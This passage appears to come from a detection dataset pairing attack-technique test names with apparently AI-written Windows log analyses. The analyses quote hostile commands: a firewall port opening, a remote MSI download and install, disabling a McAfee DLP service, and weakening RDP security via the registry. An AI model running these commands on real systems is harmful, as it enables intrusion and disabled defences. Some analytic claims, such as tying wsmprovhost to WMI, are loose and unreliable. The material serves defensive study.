   - `cmd.exe` is executed with the command `netsh advfirewall firewall add rule name=""file testing"" action=allow dir=in protocol=TCP localport=450`.
   - This command adds an inbound rule to the firewall, which could be an attempt to open a port for unauthorized access.
   - The execution of `cmd.exe` with this command under a high-integrity level suggests administrative privileges.

3. **Processes Launched from `wsmprovhost.exe`:**
   - `wsmprovhost.exe` is seen as the parent process for various executions such as `hostname.exe`, `whoami.exe`, and `cmd.exe`.
   - Although `wsmprovhost.exe` is a legitimate Windows process, it can be used maliciously to execute commands on a remote system as part of Windows Management Instrumentation (WMI) operations.

4. **Time Discrepancy:**
   - There are events related to time adjustment by `svchost.exe`, with discrepancies in time (`EventID: 4616`). This could be benign if it's due to legitimate NTP synchronization, but if coupled with other anomalies, it might indicate log tampering attempts.

**Potential Indicators of Malicious Activity:**

- Attempts to modify the firewall to allow inbound connections (`cmd.exe` and `netsh.exe`) suggest possible preparation for remote access.
- The frequent execution of `wevtutil.exe` paired with these modifications could indicate an attempt to cover tracks or tamper with event logs.
  
**Assessment:**

Based on the analysis, these logs suggest activities that warrant further scrutiny, notably the alterations to firewall settings and the potential log tampering using `wevtutil.exe`. The fact that such changes are happening under a seemingly routine user account could indicate compromised credentials or misuse of privileges.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Conduct a thorough user activity review for `SERVER002\admin_test` to ascertain if these commands were authorized.
   - Verify if the firewall rule addition was legitimate or required by any known applications or operations.

2. **Investigate Further:**
   - Initiate a security audit on the affected machine, `Server002`, to check for any anomalies or signs of compromise.
   - Review recent access logs to ensure that the admin_test account hasn’t been misused or compromised.

3. **Mitigation:**
   - Implement stricter controls on command executions and the use of administrative tools like `wevtutil.exe`.
   - Enhance monitoring of privileged accounts and ensure alerts are triggered for high-integrity operations not preceded by official tickets or approvals.

4. **Post-Incident Review:**
   - Hold a session to educate users about the potential risks and signs of account compromise.
   - Consider an evaluation of current security policies to prevent unauthorized access and changes to critical security settings."
ProtocolHandler.exe Downloaded a Suspicious File,"Upon reviewing the provided Windows event logs, the following observations and analysis have been made for potential malicious activities:

### Observations:

1. **Edge Update Activity**:
    - There are multiple entries related to Microsoft Edge Update processes. These include various commands typically associated with updating the Edge browser (`/svc`, `/update`, `/ping`, `/regsvc`, `/regserver`, etc.). These entries alone are not inherently suspicious as they align with normal browser update activities. However, multiple processes executing in quick succession could be worth investigating if it repeatedly fails or exhibits abnormal behavior. 

2. **Registry and Command Line Activity**:
    - There is an entry involving `cmd.exe` executing a complex command, querying the registry for paths related to MS Word, and executing another file `protocolhandler.exe`. The command's complexity and the invocation of external scripts or handlers via GitHub raise a red flag and could suggest an advanced attack strategy, potentially leveraging the command line to execute external malicious scripts.

3. **PowerShell and Conhost Activity**:
    - Several instances of PowerShell and `conhost.exe` (Console Window Host) are observed. An increase in PowerShell usage or in conjunction with network activities often suggests potential script execution, data exfiltration, lateral movement, or attempts to bypass security measures.
   
4. **Other Processes**:
    - Instances of `reg.exe` querying the registry which can be normal system administration activities, but warrant attention if conducted excessively or in conjunction with other suspicious activity.

### Suspicious Indicators:
- **Complex Command Execution**: The use of command line operations to interact with registry keys and call external URLs through protocolhandlers indicates potentially suspicious or unusual activity. This should be further investigated to assess whether the connected resources are legitimate or if they have been compromised or are part of a larger, controlled attack vector.
  
- **Repeated Use of System Tools**: Wevtutil and other system utilities in rapid succession could imply attempts to alter event logs or perform anti-forensic activities. The use of `whoami.exe`, `hostname.exe`, these commands are commonly used by attackers to understand environment and credentials.

### Additional Investigation:
- Investigate network connections, especially those initiated by script-based processes (e.g., PowerShell) leading to external IPs or domains.
- Validate the integrity of Edge Update and its related files, ensuring these have not been compromised or altered on disk.
- Correlate with user activity logs to confirm if any user actions match the timing of these events.
- Conduct a full file-integrity check on the system, focusing on system utilities and often-used components during lateral movement.

### Recommendation:
Given the complexity and potential abnormality:

- **Resolution**: **SUSPICIOUS**
- **Action**: Conduct a deeper investigation into the command line executions particularly focusing on the command lines that involve external protocols and commands executed using PowerShell. Monitor any outgoing network activity for unusual destinations related to these events and cross-check against known threat intelligence databases.

The activities observed, particularly the manipulation of registry and invocation of specific handler operations through command-line operations, require further examination before concluding on actual compromise or threat presence. Ensure monitoring solutions are actively tuned to catch similar patterns of behavior in the future."
Bypass UAC using sdclt DelegateExecute,"Upon analyzing the provided event logs, several points of interest and potential concerns were identified:

### Security Log

1. **Event ID 4624 (Logon):** This event indicates a successful logon of the SYSTEM account using the “Advapi” process which typically means a service startup. The logon type 5 (Service) is expected for such cases and points to legitimate behavior.
  
2. **Event ID 4672 (Special Privileges Assigned):** SYSTEM was granted multiple high-level privileges, which is normal for the SYSTEM account. However, the privileges listed (including SeDebugPrivilege) have the potential to be exploited if obtained by an unauthorized user.

3. **Event IDs 4616 (System Time Changed):** Indicates that the system time was adjusted, occasionally seen as an indicator of an attempt to obscure audit trails or synchronize with a specific schedule for scheduled tasks or attacks. However, there is no direct sign that these changes were malicious as they were conducted by ""LOCAL SERVICE"".

### Application Log

- **Windows Defender Events:** Security product state remains active, indicating no interception or disabling of security services.

### Windows PowerShell Log

- **PowerShell Activity:**
  - A script is attempting to alter registry entries associated with shell/open commands to alter cmd.exe to /c notepad.exe followed by starting “sdclt.exe”. The immediate anomaly here is that `sdclt.exe` can be used in fileless malware attacks to bypass UAC, indicating suspicious activity.

### System Log

- **Kernel and Time Services:** Events related to time service and system operations appear normal, with time synchronization occurring as expected.

### Sysmon Log

- **Processes and Commands:**
  - Consistent use of administrative account ""SERVER002\\admin_test"" running `wevtutil.exe` and `conhost.exe`. While these could be mundane, if unexplained, such programs could suggest attempts to clear logs or interact with the system's console in a potentially unauthorized manner.
  - Notably, the PowerShell command `New-Item` and manipulation of `HKCU` registry related to opening commands for folders is highly suspect. This kind of activity can signify an attempt to hijack user sessions or conduct code execution upon benign actions.

### Assessment

- **Suspicious Indicators:**
  - The PowerShell script exhibiting registry manipulation and utilization of `sdclt.exe` is concerning and represents an obvious indicator of potential misuse for malicious purposes such as privilege escalation or persistence.
  - The repetitive use of `wevtutil.exe` may suggest attempts to manipulate or clear event logs, especially when correlated with unauthorized actions.

### Conclusion

Given the suspicious PowerShell activity combined with questionable use of system utilities (`wevtutil.exe`), the logs contain actions that require further investigation to determine the full extent of their impact and intent.

**Resolution: SUSPICIOUS**

### Guidance

- **Immediate Actions:**
  - Investigate the purpose and context of the PowerShell script to confirm whether it is authorized or potentially harmful.
  - Review current system access logs and user behavior for the account ""admin_test"" to verify their legitimacy.
  - Recommend implementing additional monitoring (e.g., deeper logging, behavior analytics) to detect further signs of compromise activity.
  
- **Long-term Safeguards:**
  - Ensure that Windows Defender remains current and unobstructed.
  - Conduct security awareness for privileged users regarding script and registry manipulation risks.
  - Evaluate and potentially tighten GPO settings to mitigate unauthorized PowerShell script execution risks.

Further analysis and proactive monitoring are strongly encouraged to prevent any malicious exploitation based on these observed activities."
MSXSL Bypass using local files,"In analyzing the provided logs, a few areas merit a close examination:

1. **Security Logs**:
   - Event ID 4624: This indicates successful log-ons. These log-on events show that someone or something has successfully authenticated with the server. Logon Type 5 is a service logon, which is expected on a server running multiple services.
   - Event ID 4672: These privilege use events show that the account 'SYSTEM' obtained special privileges. Such privileges are common for the Local System account.
   - Event ID 5379: This event is logged when a logon session is abandoned (removed) due to a failure while assigning a token to a session. The repeated attempts with ReturnCode indicating failure may suggest persistence mechanisms or automation failing to complete an action repeatedly.
   - Event ID 4798: Indicating enumeration of local groups which can be benign in scheduled service activities, but can also be used by malicious actors to escalate privileges or prepare further attacks.

2. **Sysmon Logs**:
   - We observe a series of process creation events using `wevtutil.exe` and `powershell.exe`. Wevtutil is a utility that allows command-line access for managing event logs, and while it has legitimate uses, it's also often used by attackers to clear logs or extract data.
   - The presence of PowerShell execution by `admin_test` user indicates potential misuse, possibly running scripts silently with administrative privileges. PowerShell is a powerful tool that can be used for legitimate administrative tasks but is also frequently leveraged in malicious activities.
   - `cmd.exe` processes executing `msxsl.exe` with specific XML and XSL files are suspicious. Running these, especially from temporary file paths (`..\\Externalfiles\\msxsl.exe`), can indicate an attempt to execute malicious XSL Transform exploits or run unauthorized scripts.
   
3. **Application and System Logs**: 
   - These logs report system-level operations and state changes but show no direct indications of any anomalous behavior related to the suspicious logs noted above. The presence and operation of Windows Defender suggest ongoing, albeit possibly inadequate, security operations on the host.

4. **General Observations**:
   - It is suspicious to observe repeated PowerShell and `wevtutil` executions, especially those potentially associated with clearing or tampering with event logs.
   - The execution path and file names in use with Cmd and PowerShell indicate activities aimed at hiding or obfuscating actions. These could be stages in an elaborate sequence to either clean up traces or prepare for another attack.

**Assessment**: SUSPICIOUS

**Guidance on How to Proceed**:
1. **Further Investigation**: Conduct a deeper analysis into the scripts or commands executed through PowerShell and Cmd to determine their purpose and any unintended effects. Verify the integrity and purpose of `msxsl.exe`, especially given its execution from paths indicating temporary or possibly transient files.
   
2. **Forensic Analysis**: Check for persistence mechanisms possibly established by the actor behind the suspicious activities. This may include scheduled tasks, registry keys, or other forms of auto-run entries.

3. **Mitigation and Monitoring**: Ensure real-time monitoring is active, especially for subsequent execution of PowerShell and `wevtutil`. Enforce strict access controls, especially for the `admin_test` account, and ensure it is necessary and justified.

4. **Patching and Security Enhancements**: Review current security policies, ensure all systems are patched, and employ enhanced detection mechanisms such as Sysmon for comprehensive monitoring and logging.

5. **Review User Activity**: Investigate the administrative rights and actions performed by users with elevated privileges in this timeline, especially the `admin_test` account, and consider reset or change of administrative credentials.

Through these steps, the investigation can better determine the source and intent behind these actions, addressing potential vulnerabilities or gaps in security posture."
CMSTP Executing UAC Bypass,"Upon reviewing the provided Windows event logs, several observations stand out concerning potential anomalous or suspicious activities. However, we do not identify definitive malicious activities without further investigation.

### Observations:
1. **Frequent Execution of Edge Update Processes:**
   - There are numerous instances related to Microsoft Edge Update processes executing various sub-processes for update and installation activities. Such activities, especially when frequent or involving numerous temporary files like `EDGEMITMP_D96A2.tmp`, may not necessarily be suspicious on their own, but can be contextually unusual if observed outside of regular update schedules.

2. **Execution of System Administration Tools:**
   - Processes such as `powershell.exe`, `whoami.exe`, `cmd.exe`, and `wevtutil.exe` are recorded with the user `SERVER002\admin_test`. While these are legitimate Windows tools, when used in combination or frequently in a short period, they can suggest potential scripting activity or administrative task automation. The command `cmstp.exe` seen in the command line could be used as means of living-off-the-land tactics for privilege escalation or code execution, often seen in suspicious activities.

3. **Privilege Assignments:**
   - The logs recorded enhanced privileges assigned to `admin_test` and `SYSTEM`, including typical administrative tasks such as `SeSecurityPrivilege`, `SeBackupPrivilege`, and `SeDebugPrivilege`. This, alone, is typical in administrative contexts but should be evaluated alongside other activities.

4. **Logon Events:**
   - Observed were logon events through NTLM, which may indicate remote activities or network login operations. Logon type `3` suggests a network logon, often associated with services or applications accessing the network.

5. **Multiple Temporary Executables:**
   - There was a significant presence of temporary setup executables and crashpad handlers related to Microsoft Edge updates. While these instances could indicate routine maintenance, the volume and frequency warrant review to ensure no additional unauthorized or malicious activities were camouflaged under this guise.

### Assessment:
Given the logs reviewed:
- Frequent and intensified system maintenance and update processes for Microsoft Edge, alongside common system tools execution in succession or short intervals, indicates the potential for further investigation.

### Resolution:
Based on the provided logs, more investigation is needed to assess the context around the use of tools like `cmstp.exe` in conjunction with `cmd.exe` and the numerous Edge update processes.
- **Resolution: SUSPICIOUS** - The events reflect suspicious behavior not necessarily classified as malicious but warrant further context exploration and validation.

### Guidance:
1. **Context Verification:**
   - Validate the frequency and context of Microsoft Edge updates within typical organizational behavior.
   - Contact any administrative users, especially `admin_test`, to assess whether the observed activities align with expected operational duties or confirmed maintenance tasks.

2. **Endpoint Review:**
   - Examine the system for additional logs and activities outside the provided timeframe to determine any preceding or succeeded actions concerning the processes identified.

3. **Network Monitoring:**
   - Match NTLM logon events with network access patterns to ensure no unauthorized or unscheduled remote operations occurred.

4. **Security Hardening:**
   - Implement tighter monitoring for tools usage like `cmstp.exe` and `powershell.exe`, configuring logging and alerting systems for anomalous patterns distinct from routine administrative behavior. 

By taking these steps, you can confirm whether the suspicious patterns indicate a benign occurrence or point to underlying security risks requiring intervention."
Remove Network Share PowerShell,"### Detailed Analysis:

#### System Logs:
1. **Event ID 24 and 1 (Kernel-General)**: These events indicate a slight change in system time, managed by `svchost.exe`. The time change is small (seconds) and consistent with legitimate system adjustments possibly due to syncing with an NTP server (`time.windows.com`). 

2. **Event ID 35 (Time-Service)**: Indicates the time source selection, which is consistent with regular network time protocol updates. 

No anomalous or suspicious activity is noted in these log entries, as such operations are typical for time synchronization tasks for maintaining accurate system time.

#### Application Logs:
- **Event ID 0 (EdgeUpdate)**: Shows Edge update service stopping. This could be a routine operation related to application maintenance or updates. No evidence of malicious activity.

#### Sysmon Logs:
The logs showcase multiple events associated with the execution of various processes, including PowerShell and Microsoft Edge Update, which need special attention:

1. **Execution of `wevtutil.exe` and `conhost.exe`**: The multiple instances are likely part of routine operations for event log management and console-based operations. The context and command lines do not immediately suggest malicious activity.

2. **PowerShell Event (Remove-SmbShare)**:
   - A PowerShell script was executed (`Remove-SmbShare` and `Remove-FileShare` commands), which might be concerning if not expected in the environment. This action is significant if unauthorized, as it indicates the removal of shares which could disrupt operations or conceal malicious activity.

3. **EdgeUpdate processes**: Most entries represent Edge update processes. The presence of `EdgeUpdate` and various `MicrosoftEdgeUpdate.exe` processes are typical of regular updates but should be noted for potentially hiding under the guise of trusted software.

#### Windows PowerShell Logs:
- **Execution Details**: Confirm the execution of a PowerShell session aimed at removing network shares. This activity is critical if not approved and may indicate an attempt to obscure or damage network configurations.

#### Security Logs:
- **Event ID 4616 (Security Time Change)**: Corresponds to earlier system time modification entries. This log assures the legitimacy of the time change operations through verified processes.

### Assessment:
Based on the logs analyzed, the prior initial analysis appears correct in identifying routine operations, including time corrections and application updates. However, the PowerShell activity involving `Remove-SmbShare` and `Remove-FileShare` commands stands out as **SUSPICIOUS** due to:
- The potential security implications of removing network shares.
- The possibility of hiding activity post-compromise or during an internal attack phase.
- Requires further investigation to confirm the intent, legitimacy, and authorization of these commands in the specific context of the server use.

### Resolution:
**SUSPICIOUS**: Follow up on the PowerShell activity to ensure it is authorized and expected. Review with IT teams and possibly related logs or alerts to confirm if the share removals align with network policies or maintenance activities."
Stop and Remove Arbitrary Security Windows Service,"### Detailed Analysis of the Logs:

**1. Application Log:**
- **EdgeUpdate Service Stopped:**
  - Entries show multiple stops of the `edgeupdate` service on `Server002`. Stopping system update services might indicate potential tampering if unexpected.

**2. Security Log:**
- **Event ID 4616 (Time Change):**
  - Reflects time synchronization, which typically happens automatically. No evident manipulation of the system clock that looks suspicious; appears consistent with system operations.
  
- **Event ID 4624 (Logon Successful):**
  - Logon for `SYSTEM` using LogonType 5 (Service Logon) indicates standard service startup processes. No anomalies detected in these logons.

- **Event ID 4672 (Special Privileges Assigned):**
  - SYSTEM is granted high-level privileges as expected for system tasks. No unexpected assignment of privileges is observed.

**3. System Log:**
- **Time Synchronization Events:**
  - Normal operation for Windows environments to sync with `time.windows.com`. No evidence of time tampering.
  
- **Security Updates:**
  - Initiation of security updates for Defender Antivirus and Windows 10. Such processes are routine operations conducted by Windows Update.

**4. Sysmon Log:**
- **Multiple Process Creations (wevtutil, conhost, edgeupdate):**
  - Processes like `wevtutil` and `conhost` executed by `admin_test`. While `wevtutil` can be used maliciously, no context shows malicious usage here.
  
- **Unusual PowerShell Command:**
  - Command `""powershell.exe & {Stop-Service -Name McAfeeDLPAgentService, Remove-Service -Name McAfeeDLPAgentService}""` executed. This command stops and removes a key security service (McAfee DLP Agent), indicating potential malicious behavior or misconfiguration.

**5. Windows PowerShell Log:**
- **Activity Stop and Remove Service Command:**
  - Confirms execution of the PowerShell command to stop and remove McAfee DLP agent, which is suspicious and needs urgent investigation.

### Assessment:
- The majority of the logs reflect typical system operations and expected service processes. However, the PowerShell command to stop and remove the McAfee DLP Agent service is concerning as it could denote an attempt to disable security defenses.

### Resolution: SUSPICIOUS
- The PowerShell activity aimed at disabling a critical security service is the primary indicator of suspicious and potentially malicious behavior. Further investigation is required to determine the intent and if it was authorized or corrective. Engage with IT and security teams to verify changes and conduct a comprehensive probe on `Server002`.

### Guidance:
- **Immediate Actions:**
  - Verify if the PowerShell command was intentional or authorized by checking change logs or consulting with authorized personnel.
  - Review the current system configuration for unauthorized changes and restore the security agent if found compromised.
  
- **Further Investigations:**
  - Look into any other instances of modifications to security-related services and analyze any correlating network or system anomalies.
  - Examine the user `SERVER002\\admin_test` for unusual activity or potential account compromise.
  
- **Preventive Measures:**
  - Implement stringent access control and auditing on key security services and administration tools.
  - Enhance detection capabilities around critical security service modifications and ensure tamper protection is enforced."
Activate Windows NoSetTaskbar Group Policy Feature,"After analyzing the provided log entries, here is the detailed assessment:

### Security Log Analysis
1. **Event ID 4616**: This event indicates a system time change. The process responsible for this is `C:\Windows\System32\svchost.exe` which is running under `LOCAL SERVICE`. Time changes can sometimes be indicators of malicious activity, especially if they are unexpected or unexplained by legitimate administrative tasks. However, svchost.exe is a legitimate Windows process and no other indicators suggest that this was maliciously triggered.

### Application Log Analysis
1. **Microsoft Edge Update Events**: Several entries (notably Active and console commands for MicrosoftEdgeUpdate.exe) indicate the starting and stopping of updates. This is standard for Edge browser updates, typically signed by ""Microsoft Corporation."" There are no anomalies in file paths, versions, or hashes that suggest tampering or masquerading activity.

### Sysmon Log Analysis
1. **Wevtutil and Cmd.exe Usage**: Entries show the execution of `wevtutil.exe` and `cmd.exe`, both commonly used Windows utilities. What stands out, however, is the use of `cmd.exe` with a registry modification command:
   - The log indicates: `cmd.exe` /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f
   - The command modifies the registry to set a taskbar policy, which can be associated with a configuration change or in some cases, malware wanting to control user interface behavior.
2. **Running HOSTNAME.EXE and WHOAMI.EXE**: Both are used for gathering system information. These tools are, however, sometimes used by attackers to probe an environment post-entry. Their usage so close together could warrant investigation if unintended.

### System Log Analysis
1. **Time Change Events**: As noted in the `Security Log`, this confirms a system time adjustment, appearing twice and aligning with expected patterns due to time syncing operations with `time.windows.com`.

### Assessment
- The primary concern is around the `cmd.exe` usage with the registry modification command which appears suspicious due to potential implications that can impact user experience or be indicative of a script running with system-altering intentions.
- Other logs present benign activities related to time synchronization and legitimate software update procedures.

### Resolution
- **SUSPICIOUS**: Due to the registry modification command executed via cmd.exe, which warrants further investigation to ensure this wasn't part of any unauthorized or unintended script execution potentially impacting user policy settings or masking other activities.

### Guidance
- Investigate the source initiating the cmd.exe processes to understand whether this was expected (within a maintenance script or application) or part of an unauthorized change.
- Verify the origin and purpose of these commands with the associated administrative team, and monitor for any further unusual registry modifications.
- Implement stricter monitoring for cmd.exe execution involving system-altering commands to provide real-time alerts for future occurrences."
Indicator Manipulation using FSUtil,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the activities and events observed:

### Application Logs:
- The log includes events related to the stopping of the `edgeupdate` service, which could be related to regular updates from Microsoft Edge. It appears to be benign at face value, but absence of more context, it's hard to confirm if it's unusual without corresponding update events.

### Security Logs:
- **Event ID 4616:** Indicates a change in system time, which can be common for legitimate maintenance activities but is also a known tactic for malware and attackers to evade time-based security controls. This should be looked into further, considering environmental baselines and if this sync corresponds with expected activities.
- **Event ID 4634 and 4624:** Show the logoff and logon of the user `admin_test` with LogonType 3 (Network). Network logons are common, but in combination with other activities might require further scrutiny.
- **Event ID 4672:** The user `admin_test` received special privileges including high-level ones like `SeDebugPrivilege`. This could be suspicious if this user does not regularly require such privileges.

### System Logs:
- **Kernel-General Event ID 1 and 24:** Reflect timezone and time updates. As mentioned, legitimate but worth confirming against legitimate activity.
- **Time-Service Event ID 35:** Indicates a change or synchronization of time from an external time source (`time.windows.com`), which again can be legitimate.

### Sysmon Logs:
- **Numerous Sysmon Event ID 1 and 5:** Reflecting process creations and accesses including mstse.exe (Microsoft Terminal Services) related to NETWORK SERVICE and SYSTEM users.
- Several tools were executed like `wevtutil.exe`, `whoami.exe`, `fsutil.exe`, `hostname.exe`, and `powershell.exe`. The commands involved do not necessarily scream maliciousness on their own but their usage context (e.g., `fsutil` zeroing data) is a technique occasionally used for evading examination or altering data. 
- The usage of commands and PowerShell suggest automation or script execution which should be assessed to determine if it's within normal operational procedures.

### Windows PowerShell Logs:
- PowerShell is used to create and modify a file (`data.txt`) and uses redirection (`echo`) and `fsutil` for file system manipulation. This script-like behavior pattern is often flagged in baselining for further review.
  
### Assessment:
- **SUSPICIOUS:** The event log entries suggest activities that merit more investigation. The special privileges assigned to `admin_test`, combined with the power use of various utilities and time changes suggest potential unauthorized activity or policy violations. A deeper analysis into user activity, baseline of user behavior, alert correlation with external threat intelligence would be prudent here. The activity on this device, specifically involving `admin_test`, should be reviewed for consistency with organizational operations.

### Guidance:
- Review the accounts, specifically `admin_test` for unauthorized access or unusual behavior.
- Cross-examine privilege assignments for congruity with user roles.
- Investigate the context of the script execution (i.e., the full PowerShell command) and the purpose for zeroing data files.
- Check for any pen logs indicating lateral movement or connections to AWS services indicating data exfiltration.
- Consider implementing enhanced monitoring on this host and account for any follow-up action.
"
Msiexec.exe - Execute Remote MSI file,"## Detailed Analysis of Logs

### Observations and Analysis:
1. **Wevtutil & Conhost Executions:**
   - The execution of `wevtutil.exe` and `conhost.exe` repeatedly by user `SERVER002\admin_test` is documented. These binaries are typically related to Windows Event Log management and Console Windows Host, respectively. 
   - The User ""admin_test"" appears to be executing various system binaries which might indicate scripted or automated tasks.

2. **Commands with Potential for Misuse:**
   - `wevtutil.exe` is a legitimate Windows utility used for logs management, which can be benign in certain contexts but can also be misused for clearing logs to cover tracks of malicious activity.
   - The frequency and rapid succession of these executions without apparent log manipulation activities might appear suspicious but alone don't provide enough evidence to confirm malicious intentions.

3. **Unusual PowerShell Execution:**
   - There is a notable PowerShell process with the command: `powershell.exe -nop -Command Write-Host JScript executed me!; exit`, indicating the execution of a script.
   - The use of the `-nop` flag (short for -NoProfile) can be indicative of an attempt to run scripts in a stealthy manner, bypassing normal startup scripts. 

4. **MSI Install from Remote Source:**
   - Command for installing an MSI package from a remote URL via `msiexec.exe` is suspicious due to:
     - Downloading and executing software directly from an external URL (https://github.com/file/file-file/raw/master/files/data.007/bin/data.007_JScript.msi).
     - MSI installs should typically be from trusted internal sources or authorized distributors, not raw files accessed through public URLs.

5. **Process Hierarchy and Execution Traces:**
   - The logs indicate a sequence that initiates from a `cmd.exe` session, invoking `msiexec.exe`, which further calls PowerShell. This chaining through a command prompt session using an external executable is a pattern often associated with malicious dropper techniques.
   - While installations can occur normally, the script execution with unusual flags and direct online download makes it suspicious.

6. **Process Integrity Levels:**
   - The logged processes are running with a high integrity level, indicating administrative permissions, enhancing the risk if actions taken are malicious.

7. **Microsoft Edge Update Activity:**
   - Various logs indicate standard Microsoft Edge update processes. These update activities using `MicrosoftEdgeUpdate.exe` appear consistent with legitimate software update processes.

### Conclusion:
- The cumulative context, especially the direct MSI install from an online resource and the related PowerShell execution, points towards potentially suspicious activity.
- While the Microsoft Edge Update logs seem consistent with legitimate updater activities, the command line execution of other processes, especially related to direct online download and execution, necessitates further exploration.

### Assessment and Resolution:
- **Resolution: SUSPICIOUS**
  - The logs contain activity that suspiciously resembles potential misuse of trusted executables and script execution patterns that require further investigation.
  - While it is not conclusively malicious due to a lack of direct evidence of harm, there is enough concern based on the tactics (e.g., use of PowerShell -nop) that warrant further investigation.

### Guidance and Next Steps:
- **Immediate Actions:**
  - Isolate the host from the network to prevent any potential lateral movement.
  - Conduct a deeper forensic analysis of the system, including memory analysis and checking filesystem changes for persistence mechanisms.
- **Recommendations:**
  - Verify the source and authenticity of the downloaded MSI file to ensure it hasn't been tampered with.
  - Conduct a review of scripts and scheduled tasks under the ""admin_test"" user to check for any unauthorized automation.
  - Implement monitoring rules that alert on similar behavior, especially the use of PowerShell with suspicious flags and external script download attempts."
Hidden Window,"### Detailed Analysis

#### Security Log

The security logs provided mainly consist of Event ID 4616, which indicates changes in the system time. This event is typically benign when observed with the standard subject user `LOCAL SERVICE` and the legitimate process `svchost.exe`. There is no indication of malicious intent just from these logs since time synchronization and adjustments are routine operations managed by the system.

#### Windows PowerShell Log

The PowerShell logs show the execution of a command that launches the calculator app (`calc.exe`) using a PowerShell session with a command line `powershell.exe & {Start-Process powershell.exe -WindowStyle hidden calc.exe}`. While running `calc.exe` by itself is not inherently malicious, using PowerShell to hide the window and execute the command can be suspicious. This is a common technique used by attackers to execute code without the user noticing. 

#### Sysmon Log

- Multiple instances of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are seen executing. These are normal executables; however, excessive or scripted use without a specific administrative task could indicate scripting or automation that warrants further scrutiny.
  
- Persistent PowerShell executions that align with the PowerShell logs show attempts to obfuscate activities by spawning multiple hidden processes which can be suspicious, especially when combined with execution attempts of benign applications like `calc.exe`.

- Notably, `Windows PowerShell` is logged again with `calc.exe` execution. The processes are initiated by scripts, likely pointing to the use of PowerShell scripts to automate or hide the activity.

#### System Log

The provided system logs reflect routine logging activities consistent with system time adjustments and do not offer any direct indicators of malicious activity. With svchost.exe being a legitimate process handling time services, further attention is not necessarily required unless coordinated with other suspicious activity.

#### Application Log

The solitary application log indicates the operation of the Software Protection Platform Service, primarily concerned with licensing—the operations here are routine and do not suggest malicious behavior.

### Assessment

Upon careful examination of the logs:
- **Suspicious Activity**: The repeated use of PowerShell to spawn hidden processes to run `calc.exe` stands out as suspicious behavior. Though `calc.exe` is not harmful itself, the method of execution suggests potential testing or enumeration activities common in early phases of malicious attacks. This could be indicative of a user or process testing persistence, automation, or the ability to run scripts undetected.
  
- **Normal Activity**: The execution of system utilities and time adjustments appear to be normal and are not inherently harmful.

### Resolution 

Given this analysis, the resolution to the logs provided is **SUSPICIOUS**. The activity observed through PowerShell logs warrants further investigation to ascertain its legitimacy. Particularly, examining who executed these PowerShell scripts, the origin, changes to the scripts, and any additional context within related logs would be prudent.

### Suggested Actions

1. **Investigate User Activity**: Determine which user or service initiated the PowerShell commands. This includes verifying if `SERVER002\admin_test` legitimately executed these actions.

2. **Review System Changes**: Check for any unauthorized modifications or scheduled tasks.

3. **Malware Scans**: Conduct a detailed scan to ensure no malicious scripts or executables are present that could have induced this behavior.

4. **Audit Security Policies**: Ensure that security policies are in place to prevent unauthorized script execution and authority misuse.

5. **Enhance Logging and Monitoring**: Increase surveillance on PowerShell and other scripting engines to alert on potentially malicious patterns."
Office 365 - Set Audit Bypass For a Mailbox,"**Analysis of the Logs:**

1. **Suspicious PowerShell Activity:**
   - The logs reveal multiple PowerShell executions with activities that include credential handling and command executions.
   - The command at `2024-10-28 12:40:29.5408583` executes PowerShell with highly sensitive operations including setting ""MailAuditBypassAssociation."" This could potentially allow bypass of mailbox auditing, which is a typical behavior seen in advanced persistent threats (APTs) or insider threats to hide malicious activities.
   - Additionally, there are further PowerShell activities where files are scanned for specific patterns, and conclusions are logged. This could be a reconnaissance step often associated with malware or attackers assessing the environment.

2. **Use of Elevated Privileges:**
   - Processes such as `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `conhost.exe` are executed with a high integrity level. It’s common for attackers to escalate their privileges to execute higher-permission tasks unwittingly on user systems.

3. **Different Host Applications Reporting or Accessing Different Files:**
   - PowerShell commands are seen initializing in unusual paths and manipulating processes or configurations not typical for a standard operation, such as accessing specific file paths and modifying access settings (`wevtutil.exe`).

4. **Seasoned Execution Timing and Scanning:**
   - Short execution intervals involving sensitive operations usually point toward script-based automation, often indicative of automated scripts running beneath the surface potentially for malicious objectives.

5. **Background of Windows Logs and Events:**
   - Although Windows logs naturally contain numerous benign activities and updates as seen here, the critical concern comes from how the PowerShell commands are structured with sensitive and obfuscated parameters (especially `ConvertTo-SecureString -AsPlainText -Force` and command snippets associated typically with Exchange Online connections).

**Assessment:**
- The presence of commands that bypass auditing features and the frequent execution of PowerShell scripts with commands obscuring credentials and performing in-depth operations suggest significant risk areas. Activity pattern matches suspicious activity often associated with attacks targeting credential theft, unauthorized access, or data manipulation.

**Recommendations:**
- Immediate isolation and forensic investigation of the server: Review for unauthorized access, validate email auditing settings, and examine for potential data leakage.
- Review access logs for correspondence-related audits.
- Conduct a full security review of PowerShell scripts executed on this server to ensure legitimacy.
- Enforce stringent monitoring on PowerShell invocation events to ascertain only trusted scripts are allowed on critical systems.
- Revoke any unauthorized privileges potentially enabled by these scripts, specifically within email settings in Exchange Online.

**Resolution:**
- **MALICIOUS** - The logs contain activities that strongly suggest malicious intent, requiring immediate response and remediation."
Enabling Remote Desktop Protocol via Remote Registry,"### Detailed Analysis of Sysmon Logs:

#### Overview:
The Sysmon logs indicate various processes executed on the server `Server002` by the user `SERVER002\admin_test`. The processes include system utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and potentially sensitive operations like registry modifications using `cmd.exe` and `reg.exe`.

#### Potentially Anomalous Activities:
- **Registry Modification using `cmd.exe`:** 
  - The process ID 5104, `cmd.exe`, executed with command-line arguments `""cmd.exe"" /c reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f`. This command modifies the security layer of the RDP configuration to 0, which might disable encryption on RDP sessions, exposing the system to further attacks.
  - `reg.exe` also appears to be executed to add the same registry key, reinforcing the modification.

- **Frequent Use of System Utilities:**
  - The logs show frequent execution of `wevtutil.exe` and `conhost.exe`, which may indicate an ongoing manual interrogation of system events or potential attempts at log manipulation or examination. Although admin users may use these tools legitimately, repeated access within a short span could be cause for suspicion.

- **Creation of `HOSTNAME.EXE` and `whoami.exe` Processes:**
